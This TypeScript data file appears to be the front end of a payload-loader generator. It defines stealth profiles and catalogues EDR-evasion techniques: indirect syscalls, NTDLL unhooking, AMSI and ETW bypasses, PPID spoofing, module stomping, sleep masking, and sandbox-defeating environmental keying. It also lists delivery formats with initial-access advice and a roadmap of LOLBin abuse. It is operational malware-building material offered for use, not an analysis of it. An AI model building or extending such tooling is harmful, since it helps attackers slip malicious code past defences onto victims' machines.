// Design data — profiles, technique groups, output formats, LOLBin roadmap.
// Ported verbatim from Claude Design bundle data.jsx.

import { Feature, LoaderType, Encryption } from '../api/generate'

export interface Profile {
  id:        'stealth' | 'balanced' | 'aggressive'
  name:      string
  tagline:   string
  score:     number
  desc:      string
  techIds:   string[]
}

export interface Technique {
  id:    string
  name:  string
  risk:  'low' | 'med' | 'high'
  desc:  string
}

export interface TechGroup {
  id:    string
  name:  string
  items: Technique[]
}

export interface OutputFormat {
  id:      string
  name:    string
  ext:     string
  opsec:   'high' | 'med' | 'low' | 'n/a'
  notes:   string
  loader:  LoaderType
}

export const PROFILES: Profile[] = [
  {
    id: 'stealth',
    name: 'Stealth',
    tagline: 'Maximum opsec. Slow, quiet, surgical.',
    score: 92,
    desc: 'Indirect syscalls, AES-GCM payload, encrypted sleep, PPID spoof, no plaintext IOCs.',
    techIds: [
      'indirect_syscalls', 'ntdll_unhook',
      'module_stomping', 'ppid_spoof',
      'ekko_sleep', 'stack_spoof',
      'aes_gcm_payload', 'env_keying',
      'api_hashing', 'string_obfuscation',
      'etw_patch', 'amsi_hwbp',
    ],
  },
  {
    id: 'balanced',
    name: 'Balanced',
    tagline: 'Reasonable footprint, broad EDR coverage.',
    score: 76,
    desc: 'Indirect syscalls + ChaCha20 payload + sleep mask + AMSI/ETW patch.',
    techIds: [
      'indirect_syscalls', 'early_bird_apc',
      'ekko_sleep', 'chacha20_payload',
      'api_hashing', 'string_obfuscation',
      'etw_patch', 'amsi_hwbp',
    ],
  },
  {
    id: 'aggressive',
    name: 'Aggressive',
    tagline: "Loud but versatile. Use when stealth isn't required.",
    score: 54,
    desc: 'Direct syscalls, simple XOR shellcode, AMSI patch only.',
    techIds: [
      'early_bird_apc', 'xor_payload',
      'string_obfuscation', 'amsi_hwbp',
    ],
  },
]

export const TECH_GROUPS: TechGroup[] = [
  {
    id: 'syscalls',
    name: 'Syscalls & API resolution',
    items: [
      { id: 'indirect_syscalls', name: "Indirect syscalls (Hell's Hall)", risk: 'low',
        desc: 'Resolve SSNs from clean NTDLL, jump through gadget in ntdll.dll. Best-in-class — bypasses hooks AND callstack scanners.' },
      { id: 'ntdll_unhook', name: 'NTDLL unhook from \\KnownDlls', risk: 'low',
        desc: 'Re-map fresh ntdll.dll .text section to overwrite inline hooks.' },
      { id: 'api_hashing', name: 'API hashing (DJB2/FNV1a)', risk: 'low',
        desc: 'Resolve imports by hash, no plaintext function names in the binary.' },
    ],
  },
  {
    id: 'encryption',
    name: 'Shellcode encryption',
    items: [
      { id: 'aes_gcm_payload', name: 'AES-256-GCM (recommended)', risk: 'low',
        desc: 'Authenticated encryption + per-build key. Strongest. Decrypt only into RW page; auth tag prevents tampering and signature scans.' },
      { id: 'chacha20_payload', name: 'ChaCha20-Poly1305', risk: 'low',
        desc: 'Faster than AES on systems without AES-NI; same authentication strength. Single 64B constexpr key.' },
      { id: 'env_keying', name: 'Environmental keying', risk: 'low',
        desc: 'Derive AES key from target hostname + domain SID. Sample is undetonateable in any sandbox/lab.' },
      { id: 'xor_payload', name: 'Rolling XOR (legacy)', risk: 'med',
        desc: '32-bit rolling key. Cheap. Use only when build size is critical — entropy signature is obvious.' },
    ],
  },
  {
    id: 'injection',
    name: 'Execution & injection',
    items: [
      { id: 'early_bird_apc', name: 'Early-Bird APC injection', risk: 'low',
        desc: 'Queue user APC on suspended thread of newly-spawned process; runs before main image entry. Best general-purpose remote technique.' },
      { id: 'module_stomping', name: 'Module stomping', risk: 'low',
        desc: 'Load a benign signed DLL, overwrite its .text with shellcode. Execution looks like a legitimate signed module.' },
      { id: 'ppid_spoof', name: 'PPID spoofing', risk: 'low',
        desc: 'Set parent process via UpdateProcThreadAttribute — child appears to descend from explorer.exe.' },
    ],
  },
  {
    id: 'memory',
    name: 'Memory & sleep',
    items: [
      { id: 'ekko_sleep', name: 'Ekko sleep mask', risk: 'low',
        desc: 'Encrypt heap + .text during sleep, restore on wake. Beats periodic memory scanners. Best sleep mask.' },
      { id: 'stack_spoof', name: 'Call stack spoofing', risk: 'low',
        desc: 'Replace return addresses with frames pointing into ntdll to look benign on stack walk.' },
    ],
  },
  {
    id: 'anti',
    name: 'Anti-analysis',
    items: [
      { id: 'amsi_hwbp', name: 'AMSI hardware-breakpoint bypass', risk: 'low',
        desc: 'Patch-free AMSI bypass via DR0–DR3 hardware breakpoints. Recommended over byte patching.' },
      { id: 'etw_patch', name: 'ETW-Ti patch', risk: 'low',
        desc: 'Neuter EtwEventWrite / NtTraceEvent to silence telemetry.' },
      { id: 'string_obfuscation', name: 'Compile-time string obfuscation', risk: 'low',
        desc: 'constexpr XOR every string literal; decrypt on stack at use.' },
    ],
  },
]

export const OUTPUT_FORMATS: OutputFormat[] = [
  { id: 'exe',         name: 'Native EXE',       ext: '.exe',         opsec: 'high', notes: 'Standalone PE. Best for initial access via USB / archive.', loader: 'Binary' },
  { id: 'dll',         name: 'Native DLL',       ext: '.dll',         opsec: 'high', notes: 'DllMain or exported entry. Pair with sideloading or rundll32.', loader: 'Dll' },
  { id: 'appdomain',   name: 'AppDomainManager', ext: '.dll+.config', opsec: 'high', notes: 'Hijack a signed .NET binary via DLL/CONFIG side-load. Very clean parent.', loader: 'AppDomain' },
  { id: 'wsf',         name: 'WSF script',       ext: '.wsf',         opsec: 'med',  notes: 'wscript/cscript host. JScript+VBS hybrid, ADS-friendly.', loader: 'Wsf' },
  { id: 'vba',         name: 'VBA macro',        ext: '.bas',         opsec: 'low',  notes: 'Office macro. Heavy MOTW/protected-view friction post-2022.', loader: 'DocxMacro' },
  { id: 'msbuild',     name: 'MSBuild project',  ext: '.csproj',      opsec: 'high', notes: 'Inline task XML. Trusted MS-signed binary executes payload.', loader: 'MsBuild' },
  { id: 'installutil', name: 'InstallUtil',      ext: '.dll',         opsec: 'med',  notes: 'Uninstall method abuse. .NET assembly loaded by signed installer.', loader: 'InstallUtil' },
  { id: 'shellcode',   name: 'Raw shellcode',    ext: '.bin',         opsec: 'n/a',  notes: 'Position-independent blob. For embedding in your own loader.', loader: 'Binary' },
]

export const LOLBIN_ROADMAP = [
  'regsvr32', 'mshta', 'rundll32', 'regasm', 'regsvcs',
  'cmstp', 'ieexec', 'presentationhost', 'msiexec', 'wmic',
  'pcalua', 'forfiles', 'verclsid', 'diskshadow', 'odbcconf',
]

// Translate design technique IDs → backend Feature[] + Encryption.
// Some design techniques have no direct backend Feature; those are dropped silently.
const TECH_TO_FEATURE: Record<string, Feature | null> = {
  indirect_syscalls:  'DirectSyscall',
  ntdll_unhook:       'UnhookKnownDlls',
  api_hashing:        null,
  aes_gcm_payload:    null,    // encryption choice
  chacha20_payload:   null,    // encryption choice
  env_keying:         null,
  xor_payload:        null,
  early_bird_apc:     null,
  module_stomping:    'ModuleStomp',
  ppid_spoof:         'PpidSpoof',
  ekko_sleep:         'SleepEncrypt',
  stack_spoof:        'StackSpoof',
  amsi_hwbp:          'AmsiHwbp',
  etw_patch:          'EtwHwbp',
  string_obfuscation: null,
}

export function techsToBackend(techs: Set<string>): { features: Feature[]; encryption: Encryption } {
  const features: Feature[] = []
  let encryption: Encryption = 'Aes256'
  techs.forEach(t => {
    const f = TECH_TO_FEATURE[t]
    if (f) features.push(f)
    if (t === 'chacha20_payload') encryption = 'Chacha20'
    if (t === 'aes_gcm_payload')  encryption = 'Aes256'
  })
  return { features, encryption }
}
